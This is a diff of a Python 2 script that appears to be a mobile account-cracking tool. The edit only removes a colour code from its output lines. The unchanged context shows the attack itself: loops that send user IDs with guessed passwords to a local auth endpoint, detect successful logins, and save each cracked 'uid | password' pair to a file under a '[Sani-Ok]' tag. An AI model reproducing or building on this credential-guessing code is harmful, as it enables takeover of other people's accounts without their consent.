@@ -279,7 +279,7 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass1
+                print '\033[1;90m[Sani-Ok] ' + uid + ' | ' + pass1
                 ok = open('/sdcard/ids/jam_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
@@ -295,7 +295,7 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass2
+                    print '\033[1;90m[Sani-Ok] ' + uid + ' | ' + pass2
                     ok = open('/sdcard/ids/jam_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
@@ -459,7 +459,7 @@ def c_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass1
+                print '\033[1;90m[Sani-Ok] ' + uid + ' | ' + pass1
                 ok = open('/sdcard/ids/jam_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
@@ -474,7 +474,7 @@ def c_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\033[1;90m[Sani-Ok] \x1b[1;32m' + uid + ' | ' + pass2
+                    print '\033[1;90m[Sani-Ok] ' + uid + ' | ' + pass2
                     ok = open('/sdcard/ids/jam_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
